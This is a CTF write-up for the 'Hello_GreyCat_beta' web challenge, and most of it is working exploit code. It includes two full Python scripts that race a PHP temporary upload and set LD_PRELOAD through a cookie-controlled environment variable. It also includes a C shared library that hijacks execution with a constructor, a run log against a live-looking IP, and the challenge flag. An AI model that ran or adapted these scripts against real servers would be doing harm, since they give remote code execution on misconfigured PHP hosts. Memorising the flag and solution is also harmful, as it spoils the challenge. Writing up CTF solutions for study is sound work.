# Hello_GreyCat_beta

### Challenge Details

a simple web which assign user a default name and store into cookie when they first visit the website. When the user visit the website again, the backend will retrieve the cookie and inject name into system variable called `name` and then call `system('echo $name')` to greet the player.

### Key Concepts

Similar to `Hello_GreyCat_alpha`, a envirmental variable injection issue, but overwriting the echo with the BASH_FUNC extended variable does not work here. (if you get it work, please teach me)

Some simple enumeration would reveal a phpinfo page at `/info.php`, so the solution is to use race condition to upload a malicious shared library, overwrite the environmental variable of `LD_PRELOAD` and achieve RCE. Similar idea can refer to [this blog post](https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf)

### Solution

a slightly modified [exp.py](./sol/exp.py):

<details>
  <summary>Click to expand!</summary>

```python
#!/usr/bin/python
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD=open('hijack.so','rb').read()+"\r"
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script
    LFIREQ="""GET /test.php?envs[LD_PRELOAD]=TMP_FILE_PATH HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: HOSTNAME\r
\r
\r
"""
    LFIREQ="""GET /hello.php HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Cookie: info[LD_PRELOAD]=TMP_FILE_PATH\r
Proxy-Connection: Keep-Alive\r
Host: HOSTNAME\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    #print(lfireq.replace("TMP_FILE_PATH",fn).replace("HOSTNAME",host))
    s2.send(lfireq.replace("TMP_FILE_PATH",fn).replace("HOSTNAME",host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():

    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

</details>


[hijack.c](./sol/hijack.c)(a universal way of hijacking the execution flow using attribute constructor)

```c
#include <unistd.h>
#include <stdlib.h>

void payload(void){
    system("touch /tmp/pwnd");
}
__attribute__ ((__constructor__)) void exec(void){
    if (getenv("LD_PRELOAD") == NULL){ return; }
    unsetenv("LD_PRELOAD");
    payload();
    return;
}
```




```bash
$ gcc -shared -fPIC hijack.c -o hijack.so

$ python2 exp.py 34.142.161.21 12322 50
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 116523
Spawning worker pool (50)...
 1000 /  1000
:(
Shuttin' down...
```



Note: success rate depends on connection latency. I run the script on the sg server from vultr, the success rate is about 80%.

### Unintended Solution

As pointed out by IDissEverything in the discord channel:

> setting infos[name] to * will actually print out all the files in cwd
>
> so setting to /tmp/php* can also get the location of temp file

my default shell was `zsh`, I didn't capture this feature during testing, but apparently php's system function is using `sh`

```bash
# null @ DESKTOP-5IGNPD7 in ~ [23:41:47]
$ zsh -c 'name=/tmp/*;echo $name'
/tmp/*

# null @ DESKTOP-5IGNPD7 in ~ [23:41:53]
$ sh -c 'name=/tmp/*;echo $name'
/tmp/greyctf22-challs /tmp/hsperfdata_root /tmp/index.php /tmp/my.log /tmp/pwndbg /tmp/sasquatch /tmp/seetf /tmp/test.php /tmp/test.py /tmp/tmux-0
```

so actually `info.php` is not needed, we can just use `hello.php` to leak the temporary uploaded files under the folder `/tmp/` as well. And one advantage(or disadvantage for a CTF with multiple players?) of using `hello.php` to do so is that it will leak all the files under the `/tmp/directory`, which could significantly increase the chance of race condition.

[exp2.py](./sol/exp2.py)

<details>
  <summary>Click to expand!</summary>

```python
#!/usr/bin/python
import sys
import threading
import os
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD=open('hijack.so','rb').read()+"\r"
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /hello.php HTTP/1.1\r
Cookie: infos[name]=/tmp/*;\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    LFIREQ="""GET /hello.php HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Cookie: infos[LD_PRELOAD]=TMP_FILE_PATH\r
Proxy-Connection: Keep-Alive\r
Host: HOSTNAME\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    #while len(d) < offset:
    while "source=1" not in d:
        d += s.recv(offset)
    try:
        start = d.index("Hello, ")
        end = d.index("\n\n<html")
        # get rid of the transfer-encoding:chunked thing
        fn = d[start+7:end].split("\n")[0]
    except ValueError:
        return None

    s2.send(lfireq.replace("TMP_FILE_PATH",fn).replace("HOSTNAME",host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("Hello, /tmp/")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    # padded up a bit
    return i+4096

def main():

    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

</details>

### Learning Objectives

see above

### Flag

```
grey{3nv_v4r14bl3_15_5000000_d4n63r0u5_eeea3884e359995c}
```
